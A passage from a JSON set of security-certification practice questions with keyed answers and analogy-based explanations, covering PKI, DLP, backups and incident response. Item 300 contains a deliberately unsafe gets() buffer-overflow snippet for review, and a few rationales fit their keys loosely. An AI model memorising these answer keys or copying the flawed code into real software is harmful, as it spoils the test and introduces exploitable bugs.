two.)","options":{"A":"DLP","B":"NGFW","C":"UTM","D":"UEBA","E":"CASB","F":"HIPS"},"answer":"A,E","explanation":"Watch NAS and cloud file shares, stop PII from walking to personal SaaS, use document labels, no desktop agent: network/cloud DLP plus CASB.\n\nHIPS and UEBA want endpoints. A firewall does not read document attributes well.\n\nImagine a mailroom scanner that reads the stamp on the envelope and a guard who blocks banned drop-off stores.","choose":2,"pbq":false,"exhibits":[]},{"id":282,"domain":2,"stem":"A security engineer needs to select the architecture for a cloud database that will protect an organization’s sensitive data. The engineer has a choice between a single-tenant or a multitenant database architecture offered by a cloud vendor. Which of the following best describes the security benefits of the single-tenant option? (Choose two.)","options":{"A":"Most cost-effective","B":"Ease of backup and restoration","C":"High degree of privacy","D":"Low resilience to side-channel attacks","E":"Full control and ability to customize","F":"Increased geographic diversity"},"answer":"C,E","explanation":"Single-tenant means your database is not shared with strangers: more privacy and more room to customize. You pay more. Side-channel risk is lower, not 'low resilience.'\n\nImagine renting a whole cabin instead of a bunk in a hostel.","choose":2,"pbq":false,"exhibits":[]},{"id":283,"domain":4,"stem":"The information security manager at a 24-hour manufacturing facility is reviewing a contract for potential risks to the organization. The contract pertains to the support of printers and multifunction devices during non-standard business hours. Which of the following will the security manager most likely identify as a risk?","options":{"A":"Print configurations settings for locked print jobs","B":"The lack of an NDA with the company that supports its devices","C":"The lack of an MSA to govern other services provided by the service provider","D":"The lack of chain of custody for devices prior to deployment at the company"},"answer":"B","explanation":"After-hours printer techs will see leftover documents and device configs. Without an NDA they have no contract duty to keep that quiet.\n\nImagine a night janitor with a master key and no signed promise not to read the mail on the desks.","choose":1,"pbq":false,"exhibits":[]},{"id":284,"domain":1,"stem":"A penetration tester discovers a condition that causes unexpected behavior in a web application. This results in the dump of the interpreter’s debugging information, which includes the interpreter’s version, full path of binary files, and the user ID running the process. Which of the following actions would best mitigate this risk?","options":{"A":"Include routines in the application for message handling.","B":"Adopt a compiled programming language instead.","C":"Perform SAST vulnerability scans on every build.","D":"Validate user-generated input."},"answer":"A","explanation":"The app dumped interpreter debug text — versions, paths, user IDs — when something unexpected happened. That is sloppy error handling.\n\nCatch and handle the error with a safe message. Do not print the attic to the browser.\n\nImagine a clerk who, when surprised, recites the store's alarm code instead of saying 'please wait.'\n\nChanging languages or scanning later does not fix this handler.","choose":1,"pbq":false,"exhibits":[]},{"id":285,"domain":2,"stem":"A security architect is analyzing an old application that is not covered for maintenance anymore because the software company is no longer in business. Which of the following techniques should have been implemented to prevent these types of risks?","options":{"A":"Code reviews","B":"Supply chain visibility","C":"Software audits","D":"Source code escrows"},"answer":"D","explanation":"The vendor died and you cannot maintain the app. Source-code escrow would have put the code with a neutral party if they vanished.\n\nReviews and SBOMs do not give you the code after bankruptcy.\n\nImagine leaving a spare house key with a lawyer if the builder disappears.","choose":1,"pbq":false,"exhibits":[]},{"id":286,"domain":3,"stem":"To bring digital evidence in a court of law, the evidence must be:","options":{"A":"material.","B":"tangible.","C":"consistent.","D":"conserved."},"answer":"A","explanation":"Courts care that evidence is material — it actually matters to a fact in the case — and that it was handled so its story holds up.\n\nImagine a judge asking “does this receipt prove the point?” not “is this receipt made of paper?”","choose":1,"pbq":false,"exhibits":[]},{"id":287,"domain":2,"stem":"A cloud security architect has been tasked with selecting the appropriate solution given the following: • The solution must allow the lowest RTO possible. • The solution must have the least shared responsibility possible. • Patching should be a responsibility of the CSP. Which of the following solutions can best fulfill the requirements?","options":{"A":"PaaS","B":"IaaS","C":"Private","D":"SaaS"},"answer":"D","explanation":"Lowest RTO, least customer duty, CSP patches: SaaS.\n\nIaaS still makes you patch VMs. Private cloud is still yours.\n\nImagine buying a finished apartment with a super who fixes the plumbing, not a vacant lot.","choose":1,"pbq":false,"exhibits":[]},{"id":288,"domain":4,"stem":"A security analyst wants to keep track of all outbound web connections from workstations. The analyst’s company uses an on-premises web filtering solution that forwards the outbound traffic to a perimeter firewall. When the security analyst gets the connection events from the firewall, the source IP of the outbound web traffic is the translated IP of the web filtering solution. Considering this scenario involving source NAT, which of the following would be the best option to inject in the HTTP header to include the real source IP from workstations?","options":{"A":"X-Forwarded-Proto","B":"X-Forwarded-For","C":"Cache-Control","D":"Strict Transport Security","E":"Content-Security-Policy"},"answer":"B","explanation":"The firewall only sees the web filter’s NAT address. X-Forwarded-For is the header that still names the original workstation.\n\nImagine a mailroom that restamps every envelope; the “original sender” line is the only way to know which desk wrote it.","choose":1,"pbq":false,"exhibits":[]},{"id":289,"domain":3,"stem":"A security team is creating tickets to track the progress of remediation. Which of the following is used to specify the due dates for high- and critical-priority findings?","options":{"A":"MSA","B":"SLA","C":"ISA","D":"MOU"},"answer":"B","explanation":"Due dates for high and critical fixes are service levels — an SLA. An MOU is a handshake; an MSA is a master services wrapper.\n\nImagine a plumber contract that says “burst pipes in four hours”; that clock is the SLA.","choose":1,"pbq":false,"exhibits":[]},{"id":290,"domain":4,"stem":"An organization developed an incident response plan. Which of the following would be BEST to assess the effectiveness of the plan?","options":{"A":"Requesting a third-party review","B":"Generating a checklist by organizational unit","C":"Establishing role succession and call lists","D":"Creating a playbook","E":"Performing a tabletop exercise"},"answer":"E","explanation":"The cheapest honest test of an IR plan is a tabletop: walk a scenario in a room and see where the plan breaks before a live fire.\n\nImagine reading the fire-escape poster together and noticing nobody knows who grabs the guest list.","choose":1,"pbq":false,"exhibits":[]},{"id":291,"domain":2,"stem":"A few security incidents involving user authentication issues occurred recently. The security team needs to implement technical controls that ensure: • User accounts are difficult to compromise. • Certain credentials are only used for specific applications. • Users are only able to perform functions specified for their specific roles. • Passwords are not the only requirement for user authentication. The security team has enabled role-based access control and password complexity requirements throughout the organization. Which of the following additional actions does the security team need to take? (Choose two.)","options":{"A":"Enable MFA.","B":"Enable mandatory access control.","C":"Require the length of passwords to be 15 characters or more.","D":"Implement a privileged access management system.","E":"Enable OAuth.","F":"Require unsuccessful logins to be logged throughout the network."},"answer":"A,D","explanation":"They already have RBAC and complexity. Still needed: passwords must not be the only factor (MFA) and special credentials only for special apps (PAM).\n\nLonger passwords and log collection do not meet 'not only a password' or 'this cred is only for that app.'\n\nImagine a second lock plus a separate key ring for the vault.","choose":2,"pbq":false,"exhibits":[]},{"id":292,"domain":3,"stem":"An organization is looking to establish more robust security measures by implementing PKI. Which of the following should the security analyst implement when considering mutual authentication?","options":{"A":"Perfect forward secrecy on both endpoints","B":"Shared secret for both endpoints","C":"Public keys on both endpoints","D":"A common public key on each endpoint","E":"A common private key on each endpoint"},"answer":"C","explanation":"Mutual TLS means each side presents a certificate and the other side checks the matching public key. Both endpoints need their own key pair.\n\nImagine two diplomats each showing a passport the other embassy already knows how to verify.","choose":1,"pbq":false,"exhibits":[]},{"id":293,"domain":4,"stem":"A company was recently infected by malware. During the root cause analysis, the company determined that several users were installing their own applications. To prevent further compromises, the company has decided it will only allow authorized applications to run on its systems. Which of the following should the company implement?","options":{"A":"Signing","B":"Access control","C":"HIPS","D":"Permit listing"},"answer":"D","explanation":"“Only authorized applications run” is an allow list (permit listing). Everything not on the list is blocked.\n\nImagine a school laptop that will only open the apps the district pinned to the start menu.","choose":1,"pbq":false,"exhibits":[]},{"id":294,"domain":1,"stem":"A security consultant has been asked to recommend best practices for preserving digital evidence. Which of the following can be used to show the evidence has not been tampered with?","options":{"A":"Legal hold","B":"Checksum","C":"Hash value","D":"E-discovery"},"answer":"C","explanation":"To show evidence was not altered you compute a hash and keep that hash separately. Recalculating it later must match.\n\nA checksum can be a weak cousin. Legal hold and e-discovery are process labels, not the integrity stamp.\n\nImagine a sealed evidence bag with a unique seal number written in the logbook.","choose":1,"pbq":false,"exhibits":[]},{"id":295,"domain":3,"stem":"A cyberanalyst has been tasked with recovering PDF files from a provided image file. Which of the following is the best file-carving tool for PDF recovery?","options":{"A":"objdump","B":"Strings","C":"dd","D":"Foremost"},"answer":"D","explanation":"Foremost is a file-carving tool that recognizes PDF headers and footers inside a raw image and writes the files back out.\n\nImagine cutting the printed pages back out of a shredded-bag photo by looking for “%PDF” and “%%EOF.”","choose":1,"pbq":false,"exhibits":[]},{"id":296,"domain":3,"stem":"An organization handles sensitive information that must be displayed on call center technicians’ screens to verify the identities of remote callers. The technicians use three randomly selected fields of information to complete the identity verification process. Some of the fields contain PII that are unique identifiers for the remote callers. Which of the following should be implemented to identify remote callers while also reducing the risk that technicians could improperly use the identification information?","options":{"A":"Data masking","B":"Encryption","C":"Tokenization","D":"Scrubbing","E":"Substitution"},"answer":"A","explanation":"Agents must see enough of a field to confirm the caller, but not the full unique identifier. Masking leaves last-four-style fragments on screen and hides the rest.\n\nImagine a hotel key packet that shows “**** 1422” instead of the whole card number.","choose":1,"pbq":false,"exhibits":[]},{"id":297,"domain":2,"stem":"A junior developer is informed about the impact of new malware on an Advanced RISC Machine (ARM) CPU, and the code must be fixed accordingly. Based on the debug, the malware is able to insert itself in another process memory location. Which of the following technologies can the developer enable on the ARM architecture to prevent this type of malware?","options":{"A":"Execute never","B":"No-execute","C":"Total memory encryption","D":"Virtual memory protection"},"answer":"A","explanation":"ARM malware injecting into another process is stopped by Execute Never (XN) — do not run this page as code.\n\nx86 'NX' is the cousin name; on ARM the feature to turn on is XN.\n\nImagine a 'do not walk on the grass' gate that actually locks, so a picnic blanket cannot become a runway.","choose":1,"pbq":false,"exhibits":[]},{"id":298,"domain":3,"stem":"A security engineer is creating a single CSR for the following web server hostnames: • wwwint.internal • www.company.com • home.internal • www.internal Which of the following would meet the requirement?","options":{"A":"SAN","B":"CN","C":"CA","D":"CRL","E":"Issuer"},"answer":"A","explanation":"One CSR must name several different hostnames. Those extra names belong in the SAN field, not in a single Common Name.\n\nImagine one badge that must list every building nickname you use at the door.","choose":1,"pbq":false,"exhibits":[]},{"id":299,"domain":3,"stem":"An analyst has prepared several possible solutions to a successful attack on the company. The solutions need to be implemented with the LEAST amount of downtime. Which of the following should the analyst perform?","options":{"A":"Implement all the solutions at once in a virtual lab and then run the attack simulation. Collect the metrics and then choose the best solution based on the metrics.","B":"Implement every solution one at a time in a virtual lab, running a metric collection each time. After the collection, run the attack simulation, roll back each solution, and then implement the next. Choose the best solution based on the best metrics.","C":"Implement every solution one at a time in a virtual lab, running an attack simulation each time while collecting metrics. Roll back each solution and then implement the next. Choose the best solution based on the best metrics.","D":"Implement all the solutions at once in a virtual lab and then collect the metrics. After collection, run the attack simulation. Choose the best solution based on the best metrics."},"answer":"C","explanation":"To pick the least-downtime fix you test each candidate alone: apply it in the lab, replay the attack, collect metrics, roll it back, then try the next.\n\nImagine taste-testing soups one ingredient at a time instead of dumping every spice in the pot and guessing.","choose":1,"pbq":false,"exhibits":[]},{"id":300,"domain":2,"stem":"A security architect examines a section of code and discovers the following: char username[20]char password[20]gets(username)checkUserExists(username) Which of the following changes should the security architect require before approving the code for release?","options":{"A":"Allow only alphanumeric characters for the username.","B":"Make the password variable longer to support more secure passwords.","C":"Prevent more than 20 characters from being entered.","D":"Add a password parameter to the checkUserExists function."},"answer":"C","explanation":"gets(username) into a 20-char array has no length check. That is a buffer overflow waiting.\n\nCap input at 20 (or use a bounded read). Alphanumeric filters do not stop a 200-character smash.\n\nImagine a form that only has twenty boxes, with a stop at box twenty, not an open notebook.","choose":1,"pbq":false,"exhibits":[]},{"id":301,"domain":2,"stem":"A security manager is creating a connection between two networks that process data at different classification levels. The main goal of this connection is to pass data from the higher classification side to the lower classification side without causing spillage. Only approved fie types and content will be allowed. Which of the following technologies would best meet this objective?","options":{"A":"Network access control","B":"File integrity monitoring","C":"Cross-domain solution","D":"Microsegmentation"},"answer":"C","explanation":"Passing files from high to low without spilling extra classified content is a cross-domain solution: inspect, filter types, one-way or tightly brokered.\n\nNAC and microsegmentation do not read file content for spillage.\n\nImagine a mail slot that only accepts already-stamped postcards, not sealed envelopes, between two floors.","choose":1,"pbq":false,"exhibits":[]},{"id":302,"domain":3,"stem":"A security consultant has been asked to identify a simple, secure solution for a small business with a single access point. A single SSID and no guest access will be used. The customer facility is located in a crowded area of town. The customer has asked that the solution require low administrative overhead. Which of the following should the security consultant recommend?","options":{"A":"WPA3-Personal","B":"WPA2-TKIP","C":"WPA2-Enterprise","D":"WPA3-Enterprise"},"answer":"A","explanation":"One office AP, one SSID, no guests, busy street, little admin time: WPA3-Personal (SAE) is strong enough and does not need a RADIUS server.\n\nImagine a deadbolt with a modern pick-resistant key instead of hiring a full-time doorman.","choose":1,"pbq":false,"exhibits":[]},{"id":303,"domain":3,"stem":"A security team is concerned with attacks that are taking advantage of return-oriented programming against the company’s public-facing applications. Which of the following should the company implement on the public-facing servers?","options":{"A":"IDS","B":"ASLR","C":"TPM","D":"HSM"},"answer":"B","explanation":"Return-oriented programming needs predictable gadget addresses. ASLR shuffles those addresses each run so the attacker’s recipe misses.\n\nImagine rearranging the furniture every night so a burglar’s memorized path to the safe no longer works.","choose":1,"pbq":false,"exhibits":[]},{"id":304,"domain":1,"stem":"An organization is prioritizing efforts to remediate or mitigate risks identified during the latest assessment. For one of the risks, a full remediation was not possible, but the organization was able to successfully apply mitigations to reduce the likelihood of the impact. Which of the following should the organization perform next?","options":{"A":"Assess the residual risk.","B":"Update the organization’s threat model.","C":"Move to the next risk in the register.","D":"Recalculate the magnitude of the impact."},"answer":"A","explanation":"You reduced likelihood with mitigations but could not remove the risk. What remains is residual risk. Measure that before you stop.\n\nImagine boarding a window with plywood. You still walk outside and ask how hard the wind can blow through the wood. That walk is residual assessment.\n\nDo not skip to the next row in the register until that number exists.","choose":1,"pbq":false,"exhibits":[]},{"id":305,"domain":3,"stem":"A third-party organization has implemented a system that allows it to analyze customers’ data and deliver analysis results without being able to see the raw data. Which of the following is the organization implementing?","options":{"A":"Asynchronous keys","B":"Homomorphic encryption","C":"Data lake","D":"Machine learning"},"answer":"B","explanation":"The vendor computes on ciphertext and returns an encrypted answer they cannot read. That is homomorphic encryption.\n\nImagine a locked suggestion box that can still add up the votes while nobody opens the box.","choose":1,"pbq":false,"exhibits":[]},{"id":306,"domain":3,"stem":"A cloud security engineer is setting up a cloud-hosted WAF. The engineer needs to implement a solution to protect the multiple websites the organization hosts. The organization websites are: • www.mycompany.org • www.mycompany.com • campus.mycompany.com • wiki.mycompany.org The solution must save costs and be able to protect all websites. Users should be able to notify the cloud security engineer of any on-path attacks. Which of the following is the best solution?","options":{"A":"Purchase one SAN certificate.","B":"Implement self-signed certificates.","C":"Purchase one certificate for each website.","D":"Purchase one wildcard certificate."},"answer":"A","explanation":"The names span two parent domains plus cousins. A wildcard only covers one parent. One SAN certificate can list every exact hostname.\n\nImagine one passport that lists every alias, instead of four booklets or a “star” that only works for one last name.","choose":1,"pbq":false,"exhibits":[]},{"id":307,"domain":3,"stem":"A security engineer is assessing a legacy server and needs to determine if FTP is running and on which port. The service cannot be turned off, as it would impact a critical application’s ability to function. Which of the following commands would provide the information necessary to create a firewall rule to prevent that service from being exploited?","options":{"A":"service --status-all | grep ftpd","B":"chkconfig --list","C":"netstat -tulpn","D":"systemctl list-unit-file --type service ftpd","E":"service ftpd status"},"answer":"C","explanation":"You need the process that is actually listening on the network. netstat -tulpn shows sockets, PIDs, and programs so you can write the firewall rule that matches reality.\n\nImagine looking through the front window to see who is standing at the counter, not only reading the employee roster.","choose":1,"pbq":false,"exhibits":[]},{"id":308,"domain":3,"stem":"A security administrator wants to detect a potential forged sender claim in the envelope of an email. Which of the following should the security administrator implement? (Choose two).","options":{"A":"MX record","B":"DMARC","C":"SPF","D":"DNSSEC","E":"S/MIME","F":"TLS"},"answer":"B,C","explanation":"SPF lists who may send for the domain; DMARC uses SPF (and DKIM) to judge a forged envelope From and tells receivers what to do.\n\nImagine a return-address rule at the post office plus a posted policy: “if the letterhead does not match an approved printer, toss it.”","choose":2,"pbq":false,"exhibits":[]},{"id":309,"domain":2,"stem":"A company recently migrated its critical web application to a cloud provider’s environment. As part of the company’s risk management program, the company intends to conduct an external penetration test. According to the scope of work and the rules of engagement, the penetration tester will validate the web application’s security and check for opportunities to expose sensitive company information in the newly migrated cloud environment. Which of the following should be the first consideration prior to engaging in the test?","options":{"A":"Prepare a redundant server to ensure the critical web application’s availability during the test.","B":"Obtain agreement between the company and the cloud provider to conduct penetration testing.","C":"Ensure the latest patches and signatures are deployed on the web server.","D":"Create an NDA between the external penetration tester and the company."},"answer":"B","explanation":"Pentesting a cloud app needs the provider's written OK first. Many CSPs treat unapproved tests as abuse.\n\nPatches and NDAs matter; they are not first.\n\nImagine asking the landlord before you hire someone to pick the building locks.","choose":1,"pbq":false,"exhibits":[]},{"id":310,"domain":3,"stem":"A technician is reviewing the logs and notices a large number of files were transferred to remote sites over the course of three months. This activity then stopped. The files were transferred via TLS- protected HTTP sessions from systems that do not send traffic to those sites. The technician will define this threat as:","options":{"A":"a decrypting RSA using an obsolete and weakened encryption attack.","B":"a zero-day attack.","C":"an advanced persistent threat.","D":"an on-path attack."},"answer":"C","explanation":"Quiet HTTPS file copies from unusual internal hosts to unusual sites for three months, then silence, is a patient campaign — an APT.\n\nImagine a neighbor who borrowed a few tools every Tuesday all summer and then vanished.","choose":1,"pbq":false,"exhibits":[]},{"id":311,"domain":1,"stem":"The management team at a company with a large, aging server environment is conducting a server risk assessment in order to create a replacement strategy. The replacement strategy will be based upon the likelihood a server will fail, regardless of the criticality of the application running on a particular server. Which of the following should be used to prioritize the server replacements?","options":{"A":"SLE","B":"MTTR","C":"TCO","D":"MTBF","E":"MSA"},"answer":"D","explanation":"Replacement order is 'which server is most likely to die,' not 'which app is most important.' Mean time between failures is that reliability number.\n\nSLE is dollars. MTTR is how long a repair takes. TCO is lifetime cost.\n\nImagine ranking flashlights by how often the old ones have died, not by how much you like the room they sit in.","choose":1,"pbq":false,"exhibits":[]},{"id":312,"domain":4,"stem":"A company created an external application for its customers. A security researcher now reports that the application has a serious LDAP injection vulnerability that could be leveraged to bypass authentication and authorization. Which of the following actions would best resolve the issue? (Choose two.)","options":{"A":"Conduct input sanitization.","B":"Deploy a SIEM.","C":"Use containers.","D":"Patch the OS.","E":"Deploy a WAF.","F":"Deploy a reverse proxy.","G":"Deploy an IDS."},"answer":"A,E","explanation":"LDAP injection is untrusted text becoming directory commands. Sanitize (or parameterize) the input, and put a WAF in front as a second filter.\n\nImagine a receptionist who will only look up names that look like names, plus a bouncer who stops anyone shouting extra instructions.","choose":2,"pbq":false,"exhibits":[]},{"id":313,"domain":4,"stem":"Due to reports of malware targeting companies in the same industry, an organization wants to develop a comprehensive list of IoCs to determine if its systems might be affected in a similar attack. Which of the following would be best to use to develop this list?","options":{"A":"Simulators","B":"Sandbox detonation","C":"Antivirus","D":"Endpoint detection and response"},"answer":"B","explanation":"To grow an IoC list from industry malware, detonate samples in a sandbox and harvest hashes, domains, and behaviors.\n\nImagine opening a suspicious package in a blast room and writing down every label you find inside.","choose":1,"pbq":false,"exhibits":[]},{"id":314,"domain":3,"stem":"A firewall administrator needs to ensure all traffic across the company network is inspected. The administrator gathers data and finds the following information regarding the typical traffic in the network: Which of the following is the best solution to ensure the administrator can complete the assigned task?","options":{"A":"A full-tunnel VPN","B":"Web content filtering","C":"An endpoint DLP solution","D":"SSL/TLS decryption"},"answer":"D","explanation":"Most of the traffic in the table is TLS, so a firewall that cannot decrypt it is blind. SSL/TLS interception with a trusted enterprise CA lets the inspector see inside.\n\nImagine a customs officer who is handed locked suitcases and is finally given a master key for the airline’s locks.","choose":1,"pbq":false,"exhibits":["exhibits/q314_1.png"]},{"id":315,"domain":3,"stem":"Which of the following is a security concern for DNP3?","options":{"A":"Free-form messages require support.","B":"Available function codes are not standardized.","C":"Authentication is not allocated.","D":"It is an open source protocol."},"answer":"C","explanation":"Classic DNP3 has little or no real authentication in the original spec, so a spoofed command can look legitimate.\n\nImagine a factory intercom that will start a pump if anyone speaks in the right format, with no badge check.","choose":1,"pbq":false,"exhibits":[]},{"id":316,"domain":3,"stem":"A security administrator needs to develop a remediation plan to address a large number of vulnerability scan results. Which of the following should the administrator use to determine the vulnerabilities that should be addressed first?","options":{"A":"CPE","B":"CCE","C":"CVSS","D":"CVE"},"answer":"C","explanation":"CVSS is the 0–10 severity scale that lets you sort a mountain of findings so critical and high go first. CVE is only the ID; CPE names the product.\n\nImagine an ER triage color tag: you treat the red tags before you file the chart numbers.","choose":1,"pbq":false,"exhibits":[]},{"id":317,"domain":3,"stem":"An organization is researching the automation capabilities for systems within an OT network. A security analyst wants to assist with creating secure coding practices and would like to learn about the programming languages used on the PLCs. Which of the following programming languages is the MOST relevant for PLCs?","options":{"A":"Ladder logic","B":"Rust","C":"C","D":"Python","E":"Java"},"answer":"A","explanation":"PLCs are programmed in ladder logic (and related IEC 61131 languages). That is the dialect the OT secure-coding guide has to cover.\n\nImagine writing safety rules for elevator techs in the wiring-diagram language they actually draw, not in Python.","choose":1,"pbq":false,"exhibits":[]},{"id":318,"domain":1,"stem":"An organization’s senior security architect would like to develop cyberdefensive strategies based on standardized adversary techniques, tactics, and procedures commonly observed. Which of the following would best support this objective?","options":{"A":"OSINT analysis","B":"The Diamond Model of Intrusion Analysis","C":"MITRE ATT&CK","D":"Deepfake generation","E":"Closed-source intelligence reporting"},"answer":"C","explanation":"Defensive plans built from commonly observed adversary TTPs use MITRE ATT&CK as the catalog of those TTPs.\n\nThe Diamond Model maps one intrusion's pieces. OSINT is a source. Neither is the standard TTP menu.\n\nImagine a published burglar playbook used to decide where cameras go.","choose":1,"pbq":false,"exhibits":[]},{"id":319,"domain":3,"stem":"A company is looking for a solution to hide data stored in databases. The solution must meet the following requirements: • Be efficient at protecting the production environment • Not require any change to the application • Act at the presentation layer Which of the following techniques should be used?","options":{"A":"Masking","B":"Steganography","C":"Algorithmic","D":"Random substitution"},"answer":"A","explanation":"Hide production data at the presentation layer with no app rewrite: masking. The database still holds the real value; screens show a redacted form.\n\nImagine a caller-ID screen that shows “(***) ***-1422” while the billing system still has the full number.","choose":1,"pbq":false,"exhibits":[]},{"id":320,"domain":3,"stem":"A software developer is working on a piece of code required by a new software package. The code should use a protocol to verify the validity of a remote identity. Which of the following should the developer implement in the code?","options":{"A":"RSA","B":"OCSP","C":"HSTS","D":"CRL"},"answer":"B","explanation":"Live proof that a certificate is still good is OCSP — the client asks the CA’s responder “is this serial revoked?”\n\nImagine phoning the passport office to ask if a booklet is still valid, instead of flipping through yesterday’s newspaper list.","choose":1,"pbq":false,"exhibits":[]},{"id":321,"domain":2,"stem":"An organization is developing a disaster recovery plan that requires data to be backed up and available at a moment’s notice. Which of the following should the organization consider first to address this requirement?","options":{"A":"Implement a change management plan to ensure systems are using the appropriate versions.","B":"Hire additional on-call staff to be deployed if an event occurs.","C":"Design an appropriate warm site for business continuity.","D":"Identify critical business processes and determine associated software and hardware requirements."},"answer":"D","explanation":"A DR plan that must restore 'at a moment's notice' starts by naming which processes matter and which systems they sit on. Warm sites and extra staff come after that list.\n\nImagine packing a go-bag only after you decide what you cannot live without.","choose":1,"pbq":false,"exhibits":[]},{"id":322,"domain":3,"stem":"A security analyst is performing a review of a web application. During testing as a standard user, the following error log appears: Which of the following best describes the analyst’s findings and a potential mitigation technique?","options":{"A":"The findings indicate unsecure references. All potential user input needs to be properly sanitized.","B":"The findings indicate unsecure protocols. All cookies should be marked as HttpOnly.","C":"The findings indicate information disclosure. The displayed error message should be modified.","D":"The findings indicate a SQL injection. The database needs to be upgraded."},"answer":"C","explanation":"The page dumped a stack trace or path to a standard user. That is information disclosure. Show a generic error to users and keep the detail in server logs.\n\nImagine a restaurant that prints the kitchen’s home address on the “sorry, we’re out of soup” sign.","choose":1,"pbq":false,"exhibits":["exhibits/q322_1.png"]},{"id":323,"domain":3,"stem":"Which of the following is record-level encryption commonly used to do?","options":{"A":"Protect database fields.","B":"Protect individual files.","C":"Encrypt individual packets.","D":"Encrypt the master boot record."},"answer":"A","explanation":"Record-level (or field-level) encryption protects individual database columns — a SSN field, a card field — not a whole file or a packet.\n\nImagine locking just the Social Security drawer inside a filing cabinet, not padlocking the whole office.","choose":1,"pbq":false,"exhibits":[]},{"id":324,"domain":2,"stem":"An auditor is reviewing the logs from a web application to determine the source of an incident. The web application architecture includes an internet-accessible application load balancer, a number of web servers in a private subnet, application servers, and one database server in a tiered configuration. The application load balancer cannot store the logs. The following are sample log snippets: Which of the following should the auditor recommend to ensure future incidents can be traced back to the sources?","options":{"A":"Enable the X-Forwarded-For header at the load balancer.","B":"Install a software-based HIDS on the application servers.","C":"Install a certificate signed by a trusted CA.","D":"Use stored procedures on the database server.","E":"Store the value of the $_SERVER['REMOTE_ADDR'] received by the web servers."},"answer":"A","explanation":"The load balancer hides client IPs. Web logs show the LB. Enable X-Forwarded-For so the real source is recorded.\n\nStoring REMOTE_ADDR as-is just stores the load balancer again.\n\nImagine a receptionist writing 'front desk' as the visitor's name unless they also write the name on the driver's license.","choose":1,"pbq":false,"exhibits":["exhibits/q324_1.png"]},{"id":325,"domain":1,"stem":"An organization that performs real-time financial processing is implementing a new backup solution. Given the following business requirements: • The backup solution must reduce the risk for potential backup compromise • The backup solution must be resilient to a ransomware attack • The time to restore from backups is less important than the backup data integrity • Multiple copies of production data must be maintained. Which of the following backup strategies best meets these requirements?","options":{"A":"Creating a secondary, immutable database and adding live data on a continuous basis","B":"Utilizing two connected storage arrays and ensuring the arrays constantly sync","C":"Enabling remote journaling on the databases to ensure real-time transactions are mirrored","D":"Setting up anti-tampering on the databases to ensure data cannot be changed unintentionally"},"answer":"A","explanation":"They care more about backup integrity under ransomware than about speed, and they want extra copies. An immutable secondary that only accepts new live writes meets that: the copy cannot be encrypted later.\n\nTwo arrays that stay in sync will sync the ransomware too.\n\nImagine a drop-box that only accepts new envelopes and never lets anyone edit yesterday's pile.","choose":1,"pbq":false,"exhibits":[]},{"id":326,"domain":3,"stem":"A system of globally distributed certificate servers connected to HSMs provide certificate security services for a publicly available PKI. These services include OCSP, certificate revocation list issuance, and certificate signing/issuance. The HSMs are all physical devices. All other servers are virtualized. Each global site has a network load balancer, and the sites are configured to load balance between sites. Users report occasional but persistent log-on failures to different PKI-enabled websites. There is no apparent pattern to the failures. Some OCSP responses must be signed by the HSM. Each HSM is connected to a physical server containing multiple VMs for the local site with CAT 6e network cable. The backplane connecting the VMs is fiber based. Which of the following would best reduce the OCSP response time in order to rule out the connection between the certificate server and HSM as a cause of the user-reported issues?","options":{"A":"Virtualize the HSMs and convert the virtualized servers to physical systems.","B":"Replace the copper-based network infrastructure with fiber.","C":"Shorten the time the duration certificates are valid to 72 hours and implement ACME.","D":"Reduce the number of global sites while increasing the number of HSMs."},"answer":"B","explanation":"The keyed answer hardens the physical path between those globally scattered HSM and certificate servers by replacing copper with fiber (harder to tap, immune to electrical noise).\n\nImagine swapping a backyard extension cord for a buried glass line so neighbors cannot clip on and the lights stop flickering.","choose":1,"pbq":false,"exhibits":[]},{"id":327,"domain":3,"stem":"An administrator brings the company's fleet of mobile devices into its PKI in order to align device WLAN NAC configurations with existing workstations and laptops. Thousands of devices need to be reconfigured in a cost-effective, time-efficient, and secure manner. Which of the following actions best achieve this goal? (Choose two.)","options":{"A":"Using the existing MDM solution to integrate with directory services for authentication and enrollment","B":"Deploying netAuth extended key usage certificate templates","C":"Deploying serverAuth extended key usage certificate templates","D":"Deploying clientAuth extended key usage certificate templates","E":"Configuring SCEP on the CA with an OTP for bulk device enrollment","F":"Submitting a CSR to the CAto obtain a single certificate that can be used across all devices"},"answer":"A,E","explanation":"Thousands of phones need client certificates without desk-side visits. MDM plus directory handles who may enroll; SCEP with a one-time password lets the device prove itself to the CA in bulk.\n\nImagine a school issuing locker keys: the office already knows the student list, and each new lock talks to the key machine with a one-day code.","choose":2,"pbq":false,"exhibits":[]},{"id":328,"domain":1,"stem":"The ISAC for the retail industry recently released a report regarding social engineering tactics in which small groups create distractions for employees while other malicious individuals install advanced card skimmers on the payment systems. The Chief Information Security Officer (CISO) thinks that security awareness training, technical control implementations, and governance already in place is adequate to protect from this threat. The board would like to test these controls. Which of the following should the CISO recommend?","options":{"A":"Dark web monitoring","B":"Adversary emulation engagement","C":"Supply chain risk consultation","D":"Tabletop exercises"},"answer":"B","explanation":"The board wants the claimed awareness, tech, and governance tested against the exact ISAC tactic (distraction plus skimmers). Talking in a conference room does not install a skimmer.\n\nAdversary emulation runs that tactic. That is the test.\n\nImagine paying a team to try the exact pickpocket move in your store while you watch whether staff and cameras catch it.","choose":1,"pbq":false,"exhibits":[]},{"id":329,"domain":4,"stem":"A company finds logs with modified time stamps when compared to other systems. The security team decides to improve logging and auditing for incident response. Which of the following should the team do to best accomplish this goal?","options":{"A":"Integrate a file-monitoring tool with the SIEM.","B":"Change the log solution and integrate it with the existing SIEM.","C":"Implement a central logging server, allowing only log ingestion.","D":"Rotate and back up logs every 24 hours, encrypting the backups."},"answer":"C","explanation":"Local clocks and local files were altered. Send logs only one way to a central server that applications cannot edit.\n\nImagine dropping every store receipt through a mail slot into a locked office that the cashier cannot reopen.","choose":1,"pbq":false,"exhibits":[]},{"id":330,"domain":1,"stem":"A company recently experienced a ransomware attack. Although the company performs systems and data backup on a schedule that aligns with its RPO requirements, the backup administrator could not recover critical systems and data from its offline backups to meet the RPO. Eventually, the systems and data were restored with information that was six months outside of RPO requirements. Which of the following actions should the company take to reduce the risk of a similar attack?","options":{"A":"Encrypt and label the backup tapes with the appropriate retention schedule before they are sent to the off-site location.","B":"Implement a business continuity process that includes reverting manual business processes.","C":"Perform regular disaster recovery testing of IT and non-IT systems and process.","D":"Carry out a tabletop exercise to update and verify the RACI matrix with IT and critical business functions."},"answer":"C","explanation":"Backups existed on paper RPO and still could not restore. The missing habit is regular disaster-recovery tests of IT and the business process.\n\nImagine never doing a fire drill, then discovering the spare stair is blocked, six months after you needed it.\n\nRelabeling tapes or holding a 